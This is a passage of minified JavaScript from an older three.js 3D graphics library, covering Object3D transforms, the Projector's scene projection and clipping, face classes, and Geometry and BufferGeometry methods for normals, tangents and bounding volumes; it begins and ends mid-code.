THREE.Vector3();this.eulerOrder=THREE.Object3D.defaultEulerOrder;this.scale=new THREE.Vector3(1,1,1);this.renderDepth=null;this.rotationAutoUpdate=true;this.matrix=new THREE.Matrix4();this.matrixWorld=new THREE.Matrix4();this.matrixAutoUpdate=true;this.matrixWorldNeedsUpdate=true;this.quaternion=new THREE.Quaternion();this.useQuaternion=false;this.visible=true;this.castShadow=false;this.receiveShadow=false;this.frustumCulled=true;this.userData={}};THREE.Object3D.prototype={constructor:THREE.Object3D,applyMatrix:function(){var a=new THREE.Matrix4();return function(b){this.matrix.multiplyMatrices(b,this.matrix);this.position.getPositionFromMatrix(this.matrix);this.scale.getScaleFromMatrix(this.matrix);a.extractRotation(this.matrix);if(this.useQuaternion===true){this.quaternion.setFromRotationMatrix(a)}else{this.rotation.setEulerFromRotationMatrix(a,this.eulerOrder)}}}(),rotateOnAxis:function(){var a=new THREE.Quaternion();var b=new THREE.Quaternion();return function(c,e){a.setFromAxisAngle(c,e);if(this.useQuaternion===true){this.quaternion.multiply(a)}else{b.setFromEuler(this.rotation,this.eulerOrder);b.multiply(a);this.rotation.setEulerFromQuaternion(b,this.eulerOrder)}return this}}(),translateOnAxis:function(){var a=new THREE.Vector3();return function(b,c){a.copy(b);if(this.useQuaternion===true){a.applyQuaternion(this.quaternion)}else{a.applyEuler(this.rotation,this.eulerOrder)}this.position.add(a.multiplyScalar(c));return this}}(),translate:function(b,a){console.warn("DEPRECATED: Object3D's .translate() has been removed. Use .translateOnAxis( axis, distance ) instead. Note args have been changed.");return this.translateOnAxis(a,b)},translateX:function(){var a=new THREE.Vector3(1,0,0);return function(b){return this.translateOnAxis(a,b)}}(),translateY:function(){var a=new THREE.Vector3(0,1,0);return function(b){return this.translateOnAxis(a,b)}}(),translateZ:function(){var a=new THREE.Vector3(0,0,1);return function(b){return this.translateOnAxis(a,b)}}(),localToWorld:function(a){return a.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var a=new THREE.Matrix4();return function(b){return b.applyMatrix4(a.getInverse(this.matrixWorld))}}(),lookAt:function(){var a=new THREE.Matrix4();return function(b){a.lookAt(b,this.position,this.up);if(this.useQuaternion===true){this.quaternion.setFromRotationMatrix(a)}else{this.rotation.setEulerFromRotationMatrix(a,this.eulerOrder)}}}(),add:function(a){if(a===this){console.warn("THREE.Object3D.add: An object can't be added as a child of itself.");return}if(a instanceof THREE.Object3D){if(a.parent!==undefined){a.parent.remove(a)}a.parent=this;this.children.push(a);var b=this;while(b.parent!==undefined){b=b.parent}if(b!==undefined&&b instanceof THREE.Scene){b.__addObject(a)}}},remove:function(b){var a=this.children.indexOf(b);if(a!==-1){b.parent=undefined;this.children.splice(a,1);var c=this;while(c.parent!==undefined){c=c.parent}if(c!==undefined&&c instanceof THREE.Scene){c.__removeObject(b)}}},traverse:function(c){c(this);for(var b=0,a=this.children.length;b<a;b++){this.children[b].traverse(c)}},getObjectById:function(f,b){for(var c=0,a=this.children.length;c<a;c++){var e=this.children[c];if(e.id===f){return e}if(b===true){e=e.getObjectById(f,b);if(e!==undefined){return e}}}return undefined},getObjectByName:function(c,b){for(var e=0,a=this.children.length;e<a;e++){var f=this.children[e];if(f.name===c){return f}if(b===true){f=f.getObjectByName(c,b);if(f!==undefined){return f}}}return undefined},getChildByName:function(b,a){console.warn("DEPRECATED: Object3D's .getChildByName() has been renamed to .getObjectByName().");return this.getObjectByName(b,a)},getDescendants:function(c){if(c===undefined){c=[]}Array.prototype.push.apply(c,this.children);for(var b=0,a=this.children.length;b<a;b++){this.children[b].getDescendants(c)}return c},updateMatrix:function(){if(this.useQuaternion===false){this.matrix.makeFromPositionEulerScale(this.position,this.rotation,this.eulerOrder,this.scale)}else{this.matrix.makeFromPositionQuaternionScale(this.position,this.quaternion,this.scale)}this.matrixWorldNeedsUpdate=true},updateMatrixWorld:function(c){if(this.matrixAutoUpdate===true){this.updateMatrix()}if(this.matrixWorldNeedsUpdate===true||c===true){if(this.parent===undefined){this.matrixWorld.copy(this.matrix)}else{this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)}this.matrixWorldNeedsUpdate=false;c=true}for(var b=0,a=this.children.length;b<a;b++){this.children[b].updateMatrixWorld(c)}},clone:function(a){if(a===undefined){a=new THREE.Object3D()}a.name=this.name;a.up.copy(this.up);a.position.copy(this.position);if(a.rotation instanceof THREE.Vector3){a.rotation.copy(this.rotation)}a.eulerOrder=this.eulerOrder;a.scale.copy(this.scale);a.renderDepth=this.renderDepth;a.rotationAutoUpdate=this.rotationAutoUpdate;a.matrix.copy(this.matrix);a.matrixWorld.copy(this.matrixWorld);a.matrixAutoUpdate=this.matrixAutoUpdate;a.matrixWorldNeedsUpdate=this.matrixWorldNeedsUpdate;a.quaternion.copy(this.quaternion);a.useQuaternion=this.useQuaternion;a.visible=this.visible;a.castShadow=this.castShadow;a.receiveShadow=this.receiveShadow;a.frustumCulled=this.frustumCulled;a.userData=JSON.parse(JSON.stringify(this.userData));for(var b=0;b<this.children.length;b++){var c=this.children[b];a.add(c.clone())}return a}};THREE.Object3D.defaultEulerOrder="XYZ",THREE.Object3DIdCount=0;THREE.Projector=function(){var Z,J,Q=[],q=0,D,c,f=[],b=0,l,S,P=[],k=0,t,y=[],F=0,j,W,Y=[],B=0,T,s,A=[],O=0,M={objects:[],sprites:[],lights:[],elements:[]},N=new THREE.Vector3(),L=new THREE.Vector4(),x=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),aa=new THREE.Box3(),V=new Array(3),U=new Array(4),a=new THREE.Matrix4(),g=new THREE.Matrix4(),G,I=new THREE.Matrix4(),u=new THREE.Matrix3(),r=new THREE.Matrix3(),e=new THREE.Vector3(),X=new THREE.Frustum(),z=new THREE.Vector4(),h=new THREE.Vector4();this.projectVector=function(ab,ac){ac.matrixWorldInverse.getInverse(ac.matrixWorld);g.multiplyMatrices(ac.projectionMatrix,ac.matrixWorldInverse);return ab.applyProjection(g)};this.unprojectVector=function(ab,ac){ac.projectionMatrixInverse.getInverse(ac.projectionMatrix);g.multiplyMatrices(ac.matrixWorld,ac.projectionMatrixInverse);return ab.applyProjection(g)};this.pickingRay=function(ac,ad){ac.z=-1;var ab=new THREE.Vector3(ac.x,ac.y,1);this.unprojectVector(ac,ad);this.unprojectVector(ab,ad);ab.sub(ac).normalize();return new THREE.Raycaster(ac,ab)};var R=function(ab,ac){J=0;M.objects.length=0;M.sprites.length=0;M.lights.length=0;var ad=function(ag){for(var ah=0,ae=ag.children.length;ah<ae;ah++){var af=ag.children[ah];if(af.visible===false){continue}if(af instanceof THREE.Light){M.lights.push(af)}else{if(af instanceof THREE.Mesh||af instanceof THREE.Line){if(af.frustumCulled===false||X.intersectsObject(af)===true){Z=p();Z.object=af;if(af.renderDepth!==null){Z.z=af.renderDepth}else{N.getPositionFromMatrix(af.matrixWorld);N.applyProjection(g);Z.z=N.z}M.objects.push(Z)}}else{if(af instanceof THREE.Sprite||af instanceof THREE.Particle){Z=p();Z.object=af;if(af.renderDepth!==null){Z.z=af.renderDepth}else{N.getPositionFromMatrix(af.matrixWorld);N.applyProjection(g);Z.z=N.z}M.sprites.push(Z)}else{Z=p();Z.object=af;if(af.renderDepth!==null){Z.z=af.renderDepth}else{N.getPositionFromMatrix(af.matrixWorld);N.applyProjection(g);Z.z=N.z}M.objects.push(Z)}}}ad(af)}};ad(ab);if(ac===true){M.objects.sort(w)}return M};this.projectScene=function(an,ak,aq,ac){var am=false,aA,at,ay,ai,aD,ap,aB,aI,aG,ao,az,au,ax,ah,ab,ag,af,ad,av,aw,aL,aJ,aH,aF,ae,al;S=0;t=0;W=0;s=0;M.elements.length=0;if(an.autoUpdate===true){an.updateMatrixWorld()}if(ak.parent===undefined){ak.updateMatrixWorld()}a.copy(ak.matrixWorldInverse.getInverse(ak.matrixWorld));g.multiplyMatrices(ak.projectionMatrix,a);r.getNormalMatrix(a);X.setFromMatrix(g);M=R(an,aq);for(aA=0,at=M.objects.length;aA<at;aA++){ax=M.objects[aA].object;G=ax.matrixWorld;c=0;if(ax instanceof THREE.Mesh){ah=ax.geometry;ab=ah.vertices;ag=ah.faces;av=ah.faceVertexUvs;u.getNormalMatrix(G);ae=ax.material instanceof THREE.MeshFaceMaterial;al=ae===true?ax.material:null;for(ay=0,ai=ab.length;ay<ai;ay++){D=C();D.positionWorld.copy(ab[ay]).applyMatrix4(G);D.positionScreen.copy(D.positionWorld).applyMatrix4(g);D.positionScreen.x/=D.positionScreen.w;D.positionScreen.y/=D.positionScreen.w;D.positionScreen.z/=D.positionScreen.w;D.visible=!(D.positionScreen.x<-1||D.positionScreen.x>1||D.positionScreen.y<-1||D.positionScreen.y>1||D.positionScreen.z<-1||D.positionScreen.z>1)}for(aD=0,ap=ag.length;aD<ap;aD++){af=ag[aD];var aC=ae===true?al.materials[af.materialIndex]:ax.material;if(aC===undefined){continue}var aj=aC.side;if(af instanceof THREE.Face3){aL=f[af.a];aJ=f[af.b];aH=f[af.c];V[0]=aL.positionScreen;V[1]=aJ.positionScreen;V[2]=aH.positionScreen;if(aL.visible===true||aJ.visible===true||aH.visible===true||x.isIntersectionBox(aa.setFromPoints(V))){am=((aH.positionScreen.x-aL.positionScreen.x)*(aJ.positionScreen.y-aL.positionScreen.y)-(aH.positionScreen.y-aL.positionScreen.y)*(aJ.positionScreen.x-aL.positionScreen.x))<0;if(aj===THREE.DoubleSide||am===(aj===THREE.FrontSide)){l=o();l.v1.copy(aL);l.v2.copy(aJ);l.v3.copy(aH)}else{continue}}else{continue}}else{if(af instanceof THREE.Face4){aL=f[af.a];aJ=f[af.b];aH=f[af.c];aF=f[af.d];U[0]=aL.positionScreen;U[1]=aJ.positionScreen;U[2]=aH.positionScreen;U[3]=aF.positionScreen;if(aL.visible===true||aJ.visible===true||aH.visible===true||aF.visible===true||x.isIntersectionBox(aa.setFromPoints(U))){am=(aF.positionScreen.x-aL.positionScreen.x)*(aJ.positionScreen.y-aL.positionScreen.y)-(aF.positionScreen.y-aL.positionScreen.y)*(aJ.positionScreen.x-aL.positionScreen.x)<0||(aJ.positionScreen.x-aH.positionScreen.x)*(aF.positionScreen.y-aH.positionScreen.y)-(aJ.positionScreen.y-aH.positionScreen.y)*(aF.positionScreen.x-aH.positionScreen.x)<0;if(aj===THREE.DoubleSide||am===(aj===THREE.FrontSide)){l=m();l.v1.copy(aL);l.v2.copy(aJ);l.v3.copy(aH);l.v4.copy(aF)}else{continue}}else{continue}}}l.normalModel.copy(af.normal);if(am===false&&(aj===THREE.BackSide||aj===THREE.DoubleSide)){l.normalModel.negate()}l.normalModel.applyMatrix3(u).normalize();l.normalModelView.copy(l.normalModel).applyMatrix3(r);l.centroidModel.copy(af.centroid).applyMatrix4(G);ad=af.vertexNormals;for(aB=0,aI=ad.length;aB<aI;aB++){var aK=l.vertexNormalsModel[aB];aK.copy(ad[aB]);if(am===false&&(aj===THREE.BackSide||aj===THREE.DoubleSide)){aK.negate()}aK.applyMatrix3(u).normalize();var aE=l.vertexNormalsModelView[aB];aE.copy(aK).applyMatrix3(r)}l.vertexNormalsLength=ad.length;for(aG=0,ao=av.length;aG<ao;aG++){aw=av[aG][aD];if(aw===undefined){continue}for(az=0,au=aw.length;az<au;az++){l.uvs[aG][az]=aw[az]}}l.color=af.color;l.material=aC;e.copy(l.centroidModel).applyProjection(g);l.z=e.z;M.elements.push(l)}}else{if(ax instanceof THREE.Line){I.multiplyMatrices(g,G);ab=ax.geometry.vertices;aL=C();aL.positionScreen.copy(ab[0]).applyMatrix4(I);var ar=ax.type===THREE.LinePieces?2:1;for(ay=1,ai=ab.length;ay<ai;ay++){aL=C();aL.positionScreen.copy(ab[ay]).applyMatrix4(I);if((ay+1)%ar>0){continue}aJ=f[c-2];z.copy(aL.positionScreen);h.copy(aJ.positionScreen);if(E(z,h)===true){z.multiplyScalar(1/z.w);h.multiplyScalar(1/h.w);j=K();j.v1.positionScreen.copy(z);j.v2.positionScreen.copy(h);j.z=Math.max(z.z,h.z);j.material=ax.material;if(ax.material.vertexColors===THREE.VertexColors){j.vertexColors[0].copy(ax.geometry.colors[ay]);j.vertexColors[1].copy(ax.geometry.colors[ay-1])}M.elements.push(j)}}}}}for(aA=0,at=M.sprites.length;aA<at;aA++){ax=M.sprites[aA].object;G=ax.matrixWorld;if(ax instanceof THREE.Particle){L.set(G.elements[12],G.elements[13],G.elements[14],1);L.applyMatrix4(g);L.z/=L.w;if(L.z>0&&L.z<1){T=H();T.object=ax;T.x=L.x/L.w;T.y=L.y/L.w;T.z=L.z;T.rotation=ax.rotation.z;T.scale.x=ax.scale.x*Math.abs(T.x-(L.x+ak.projectionMatrix.elements[0])/(L.w+ak.projectionMatrix.elements[12]));T.scale.y=ax.scale.y*Math.abs(T.y-(L.y+ak.projectionMatrix.elements[5])/(L.w+ak.projectionMatrix.elements[13]));T.material=ax.material;M.elements.push(T)}}}if(ac===true){M.elements.sort(w)}return M};function p(){if(J===q){var ab=new THREE.RenderableObject();Q.push(ab);q++;J++;return ab}return Q[J++]}function C(){if(c===b){var ab=new THREE.RenderableVertex();f.push(ab);b++;c++;return ab}return f[c++]}function o(){if(S===k){var ab=new THREE.RenderableFace3();P.push(ab);k++;S++;return ab}return P[S++]}function m(){if(t===F){var ab=new THREE.RenderableFace4();y.push(ab);F++;t++;return ab}return y[t++]}function K(){if(W===B){var ab=new THREE.RenderableLine();Y.push(ab);B++;W++;return ab}return Y[W++]}function H(){if(s===O){var ab=new THREE.RenderableParticle();A.push(ab);O++;s++;return ab}return A[s++]}function w(ac,ab){return ab.z-ac.z}function E(af,ae){var ad=0,ai=1,ag=af.z+af.w,ac=ae.z+ae.w,ab=-af.z+af.w,ah=-ae.z+ae.w;if(ag>=0&&ac>=0&&ab>=0&&ah>=0){return true}else{if((ag<0&&ac<0)||(ab<0&&ah<0)){return false}else{if(ag<0){ad=Math.max(ad,ag/(ag-ac))}else{if(ac<0){ai=Math.min(ai,ag/(ag-ac))}}if(ab<0){ad=Math.max(ad,ab/(ab-ah))}else{if(ah<0){ai=Math.min(ai,ab/(ab-ah))}}if(ai<ad){return false}else{af.lerp(ae,ad);ae.lerp(af,1-ai);return true}}}}};THREE.Face3=function(g,f,k,j,h,e){this.a=g;this.b=f;this.c=k;this.normal=j instanceof THREE.Vector3?j:new THREE.Vector3();this.vertexNormals=j instanceof Array?j:[];this.color=h instanceof THREE.Color?h:new THREE.Color();this.vertexColors=h instanceof Array?h:[];this.vertexTangents=[];this.materialIndex=e!==undefined?e:0;this.centroid=new THREE.Vector3()};THREE.Face3.prototype={constructor:THREE.Face3,clone:function(){var c=new THREE.Face3(this.a,this.b,this.c);c.normal.copy(this.normal);c.color.copy(this.color);c.centroid.copy(this.centroid);c.materialIndex=this.materialIndex;var b,a;for(b=0,a=this.vertexNormals.length;b<a;b++){c.vertexNormals[b]=this.vertexNormals[b].clone()}for(b=0,a=this.vertexColors.length;b<a;b++){c.vertexColors[b]=this.vertexColors[b].clone()}for(b=0,a=this.vertexTangents.length;b<a;b++){c.vertexTangents[b]=this.vertexTangents[b].clone()}return c}};THREE.Face4=function(g,f,l,k,j,h,e){this.a=g;this.b=f;this.c=l;this.d=k;this.normal=j instanceof THREE.Vector3?j:new THREE.Vector3();this.vertexNormals=j instanceof Array?j:[];this.color=h instanceof THREE.Color?h:new THREE.Color();this.vertexColors=h instanceof Array?h:[];this.vertexTangents=[];this.materialIndex=e!==undefined?e:0;this.centroid=new THREE.Vector3()};THREE.Face4.prototype={constructor:THREE.Face4,clone:function(){var c=new THREE.Face4(this.a,this.b,this.c,this.d);c.normal.copy(this.normal);c.color.copy(this.color);c.centroid.copy(this.centroid);c.materialIndex=this.materialIndex;var b,a;for(b=0,a=this.vertexNormals.length;b<a;b++){c.vertexNormals[b]=this.vertexNormals[b].clone()}for(b=0,a=this.vertexColors.length;b<a;b++){c.vertexColors[b]=this.vertexColors[b].clone()}for(b=0,a=this.vertexTangents.length;b<a;b++){c.vertexTangents[b]=this.vertexTangents[b].clone()}return c}};THREE.Geometry=function(){this.id=THREE.GeometryIdCount++;this.name="";this.vertices=[];this.colors=[];this.normals=[];this.faces=[];this.faceUvs=[[]];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphColors=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingBox=null;this.boundingSphere=null;this.hasTangents=false;this.dynamic=true;this.verticesNeedUpdate=false;this.elementsNeedUpdate=false;this.uvsNeedUpdate=false;this.normalsNeedUpdate=false;this.tangentsNeedUpdate=false;this.colorsNeedUpdate=false;this.lineDistancesNeedUpdate=false;this.buffersNeedUpdate=false};THREE.Geometry.prototype={constructor:THREE.Geometry,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,applyMatrix:function(b){var k=new THREE.Matrix3().getNormalMatrix(b);for(var f=0,a=this.vertices.length;f<a;f++){var h=this.vertices[f];h.applyMatrix4(b)}for(var f=0,a=this.faces.length;f<a;f++){var g=this.faces[f];g.normal.applyMatrix3(k).normalize();for(var c=0,e=g.vertexNormals.length;c<e;c++){g.vertexNormals[c].applyMatrix3(k).normalize()}g.centroid.applyMatrix4(b)}},computeCentroids:function(){var c,b,a;for(c=0,b=this.faces.length;c<b;c++){a=this.faces[c];a.centroid.set(0,0,0);if(a instanceof THREE.Face3){a.centroid.add(this.vertices[a.a]);a.centroid.add(this.vertices[a.b]);a.centroid.add(this.vertices[a.c]);a.centroid.divideScalar(3)}else{if(a instanceof THREE.Face4){a.centroid.add(this.vertices[a.a]);a.centroid.add(this.vertices[a.b]);a.centroid.add(this.vertices[a.c]);a.centroid.add(this.vertices[a.d]);a.centroid.divideScalar(4)}}}},computeFaceNormals:function(){var a=new THREE.Vector3(),k=new THREE.Vector3();for(var j=0,h=this.faces.length;j<h;j++){var g=this.faces[j];var e=this.vertices[g.a];var c=this.vertices[g.b];var b=this.vertices[g.c];a.subVectors(b,c);k.subVectors(e,c);a.cross(k);a.normalize();g.normal.copy(a)}},computeVertexNormals:function(h){var p,e,j,o,m,l;if(this.__tmpVertices===undefined){this.__tmpVertices=new Array(this.vertices.length);l=this.__tmpVertices;for(p=0,e=this.vertices.length;p<e;p++){l[p]=new THREE.Vector3()}for(j=0,o=this.faces.length;j<o;j++){m=this.faces[j];if(m instanceof THREE.Face3){m.vertexNormals=[new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3()]}else{if(m instanceof THREE.Face4){m.vertexNormals=[new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3()]}}}}else{l=this.__tmpVertices;for(p=0,e=this.vertices.length;p<e;p++){l[p].set(0,0,0)}}if(h){var c,b,a,t;var g=new THREE.Vector3(),s=new THREE.Vector3(),r=new THREE.Vector3(),q=new THREE.Vector3(),k=new THREE.Vector3();for(j=0,o=this.faces.length;j<o;j++){m=this.faces[j];if(m instanceof THREE.Face3){c=this.vertices[m.a];b=this.vertices[m.b];a=this.vertices[m.c];g.subVectors(a,b);s.subVectors(c,b);g.cross(s);l[m.a].add(g);l[m.b].add(g);l[m.c].add(g)}else{if(m instanceof THREE.Face4){c=this.vertices[m.a];b=this.vertices[m.b];a=this.vertices[m.c];t=this.vertices[m.d];r.subVectors(t,b);s.subVectors(c,b);r.cross(s);l[m.a].add(r);l[m.b].add(r);l[m.d].add(r);q.subVectors(t,a);k.subVectors(b,a);q.cross(k);l[m.b].add(q);l[m.c].add(q);l[m.d].add(q)}}}}else{for(j=0,o=this.faces.length;j<o;j++){m=this.faces[j];if(m instanceof THREE.Face3){l[m.a].add(m.normal);l[m.b].add(m.normal);l[m.c].add(m.normal)}else{if(m instanceof THREE.Face4){l[m.a].add(m.normal);l[m.b].add(m.normal);l[m.c].add(m.normal);l[m.d].add(m.normal)}}}}for(p=0,e=this.vertices.length;p<e;p++){l[p].normalize()}for(j=0,o=this.faces.length;j<o;j++){m=this.faces[j];if(m instanceof THREE.Face3){m.vertexNormals[0].copy(l[m.a]);m.vertexNormals[1].copy(l[m.b]);m.vertexNormals[2].copy(l[m.c])}else{if(m instanceof THREE.Face4){m.vertexNormals[0].copy(l[m.a]);m.vertexNormals[1].copy(l[m.b]);m.vertexNormals[2].copy(l[m.c]);m.vertexNormals[3].copy(l[m.d])}}}},computeMorphNormals:function(){var g,m,h,o,j;for(h=0,o=this.faces.length;h<o;h++){j=this.faces[h];if(!j.__originalFaceNormal){j.__originalFaceNormal=j.normal.clone()}else{j.__originalFaceNormal.copy(j.normal)}if(!j.__originalVertexNormals){j.__originalVertexNormals=[]}for(g=0,m=j.vertexNormals.length;g<m;g++){if(!j.__originalVertexNormals[g]){j.__originalVertexNormals[g]=j.vertexNormals[g].clone()}else{j.__originalVertexNormals[g].copy(j.vertexNormals[g])}}}var c=new THREE.Geometry();c.faces=this.faces;for(g=0,m=this.morphTargets.length;g<m;g++){if(!this.morphNormals[g]){this.morphNormals[g]={};this.morphNormals[g].faceNormals=[];this.morphNormals[g].vertexNormals=[];var e=this.morphNormals[g].faceNormals;var a=this.morphNormals[g].vertexNormals;var l,b;for(h=0,o=this.faces.length;h<o;h++){j=this.faces[h];l=new THREE.Vector3();if(j instanceof THREE.Face3){b={a:new THREE.Vector3(),b:new THREE.Vector3(),c:new THREE.Vector3()}}else{b={a:new THREE.Vector3(),b:new THREE.Vector3(),c:new THREE.Vector3(),d:new THREE.Vector3()}}e.push(l);a.push(b)}}var k=this.morphNormals[g];c.vertices=this.morphTargets[g].vertices;c.computeFaceNormals();c.computeVertexNormals();var l,b;for(h=0,o=this.faces.length;h<o;h++){j=this.faces[h];l=k.faceNormals[h];b=k.vertexNormals[h];l.copy(j.normal);if(j instanceof THREE.Face3){b.a.copy(j.vertexNormals[0]);b.b.copy(j.vertexNormals[1]);b.c.copy(j.vertexNormals[2])}else{b.a.copy(j.vertexNormals[0]);b.b.copy(j.vertexNormals[1]);b.c.copy(j.vertexNormals[2]);b.d.copy(j.vertexNormals[3])}}}for(h=0,o=this.faces.length;h<o;h++){j=this.faces[h];j.normal=j.__originalFaceNormal;j.vertexNormals=j.__originalVertexNormals}},computeTangents:function(){var M,o,C,l,L,q,A,h,p,I,F,E,g,e,c,k,j,T,S,y,x,P,O,u,s,G,D,b,R=[],Q=[],a=new THREE.Vector3(),m=new THREE.Vector3(),J=new THREE.Vector3(),N=new THREE.Vector3(),K=new THREE.Vector3(),B;for(C=0,l=this.vertices.length;C<l;C++){R[C]=new THREE.Vector3();Q[C]=new THREE.Vector3()}function z(V,r,f,W,U,w,t){I=V.vertices[r];F=V.vertices[f];E=V.vertices[W];g=p[U];e=p[w];c=p[t];k=F.x-I.x;j=E.x-I.x;T=F.y-I.y;S=E.y-I.y;y=F.z-I.z;x=E.z-I.z;P=e.x-g.x;O=c.x-g.x;u=e.y-g.y;s=c.y-g.y;G=1/(P*s-O*u);a.set((s*k-u*j)*G,(s*T-u*S)*G,(s*y-u*x)*G);m.set((P*j-O*k)*G,(P*S-O*T)*G,(P*x-O*y)*G);R[r].add(a);R[f].add(a);R[W].add(a);Q[r].add(m);Q[f].add(m);Q[W].add(m)}for(M=0,o=this.faces.length;M<o;M++){h=this.faces[M];p=this.faceVertexUvs[0][M];if(h instanceof THREE.Face3){z(this,h.a,h.b,h.c,0,1,2)}else{if(h instanceof THREE.Face4){z(this,h.a,h.b,h.d,0,1,3);z(this,h.b,h.c,h.d,1,2,3)}}}var H=["a","b","c","d"];for(M=0,o=this.faces.length;M<o;M++){h=this.faces[M];for(L=0;L<h.vertexNormals.length;L++){K.copy(h.vertexNormals[L]);A=h[H[L]];D=R[A];J.copy(D);J.sub(K.multiplyScalar(K.dot(D))).normalize();N.crossVectors(h.vertexNormals[L],D);b=N.dot(Q[A]);B=(b<0)?-1:1;h.vertexTangents[L]=new THREE.Vector4(J.x,J.y,J.z,B)}}this.hasTangents=true},computeLineDistances:function(){var e=0;var b=this.vertices;for(var c=0,a=b.length;c<a;c++){if(c>0){e+=b[c].distanceTo(b[c-1])}this.lineDistances[c]=e}},computeBoundingBox:function(){if(this.boundingBox===null){this.boundingBox=new THREE.Box3()}this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){if(this.boundingSphere===null){this.boundingSphere=new THREE.Sphere()}this.boundingSphere.setFromCenterAndPoints(this.boundingSphere.center,this.vertices)},mergeVertices:function(){var b={};var a=[],z=[];var g,A;var l=4;var x=Math.pow(10,l);var t,f,e;var c,r,s,w,h;this.__tmpVertices=undefined;for(t=0,f=this.vertices.length;t<f;t++){g=this.vertices[t];A=[Math.round(g.x*x),Math.round(g.y*x),Math.round(g.z*x)].join("_");if(b[A]===undefined){b[A]=t;a.push(this.vertices[t]);z[t]=a.length-1}else{z[t]=z[b[A]]}}var o=[];for(t=0,f=this.faces.length;t<f;t++){e=this.faces[t];if(e instanceof THREE.Face3){e.a=z[e.a];e.b=z[e.b];e.c=z[e.c];c=[e.a,e.b,e.c];var q=-1;for(var p=0;p<3;p++){if(c[p]==c[(p+1)%3]){q=p;o.push(t);break}}}else{if(e instanceof THREE.Face4){e.a=z[e.a];e.b=z[e.b];e.c=z[e.c];e.d=z[e.d];c=[e.a,e.b,e.c,e.d];var q=-1;for(var p=0;p<4;p++){if(c[p]==c[(p+1)%4]){if(q>=0){o.push(t)}q=p}}if(q>=0){c.splice(q,1);var y=new THREE.Face3(c[0],c[1],c[2],e.normal,e.color,e.materialIndex);for(s=0,w=this.faceVertexUvs.length;s<w;s++){h=this.faceVertexUvs[s][t];if(h){h.splice(q,1)}}if(e.vertexNormals&&e.vertexNormals.length>0){y.vertexNormals=e.vertexNormals;y.vertexNormals.splice(q,1)}if(e.vertexColors&&e.vertexColors.length>0){y.vertexColors=e.vertexColors;y.vertexColors.splice(q,1)}this.faces[t]=y}}}}for(t=o.length-1;t>=0;t--){this.faces.splice(t,1);for(s=0,w=this.faceVertexUvs.length;s<w;s++){this.faceVertexUvs[s].splice(t,1)}}var m=this.vertices.length-a.length;this.vertices=a;return m},clone:function(){var l=new THREE.Geometry();var k=this.vertices;for(var h=0,m=k.length;h<m;h++){l.vertices.push(k[h].clone())}var c=this.faces;for(var h=0,m=c.length;h<m;h++){l.faces.push(c[h].clone())}var f=this.faceVertexUvs[0];for(var h=0,m=f.length;h<m;h++){var b=f[h],a=[];for(var e=0,g=b.length;e<g;e++){a.push(new THREE.Vector2(b[e].x,b[e].y))}l.faceVertexUvs[0].push(a)}return l},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.GeometryIdCount=0;THREE.BufferGeometry=function(){this.id=THREE.GeometryIdCount++;this.attributes={};this.dynamic=false;this.offsets=[];this.boundingBox=null;this.boundingSphere=null;this.hasTangents=false;this.morphTargets=[]};THREE.BufferGeometry.prototype={constructor:THREE.BufferGeometry,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,applyMatrix:function(b){var a;var c;if(this.attributes.position){a=this.attributes.position.array}if(this.attributes.normal){c=this.attributes.normal.array}if(a!==undefined){b.multiplyVector3Array(a);this.verticesNeedUpdate=true}if(c!==undefined){var e=new THREE.Matrix3().getNormalMatrix(b);e.multiplyVector3Array(c);this.normalizeNormals();this.normalsNeedUpdate=true}},computeBoundingBox:function(){if(this.boundingBox===null){this.boundingBox=new THREE.Box3()}var b=this.attributes.position.array;if(b){var g=this.boundingBox;var a,h,f;if(b.length>=3){g.min.x=g.max.x=b[0];g.min.y=g.max.y=b[1];g.min.z=g.max.z=b[2]}for(var e=3,c=b.length;e<c;e+=3){a=b[e];h=b[e+1];f=b[e+2];if(a<g.min.x){g.min.x=a}else{if(a>g.max.x){g.max.x=a}}if(h<g.min.y){g.min.y=h}else{if(h>g.max.y){g.max.y=h}}if(f<g.min.z){g.min.z=f}else{if(f>g.max.z){g.max.z=f}}}}if(b===undefined||b.length===0){this.boundingBox.min.set(0,0,0);this.boundingBox.max.set(0,0,0)}},computeBoundingSphere:function(){if(this.boundingSphere===null){this.boundingSphere=new THREE.Sphere()}var c=this.attributes.position.array;if(c){var f,b=0;var a,j,h;for(var g=0,e=c.length;g<e;g+=3){a=c[g];j=c[g+1];h=c[g+2];f=a*a+j*j+h*h;if(f>b){b=f}}this.boundingSphere.radius=Math.sqrt(b)}},computeVertexNormals:function(){if(this.attributes.position){var w,l;var s,B;var D=this.attributes.position.array.length;if(this.attributes.normal===undefined){this.attributes.normal={itemSize:3,array:new Float32Array(D),numItems:D}}else{for(w=0,l=this.attributes.normal.array.length;w<l;w++){this.attributes.normal.array[w]=0}}var g=this.attributes.position.array;var o=this.attributes.normal.array;var C,A,u,m,k,h,t=new THREE.Vector3(),r=new THREE.Vector3(),q=new THREE.Vector3(),p=new THREE.Vector3(),E=new THREE.Vector3();if(this.attributes.index){var c=this.attributes.index.array;var b=this.offsets;for(s=0,B=b.length;s<B;++s){var a=b[s].start;var f=b[s].count;var 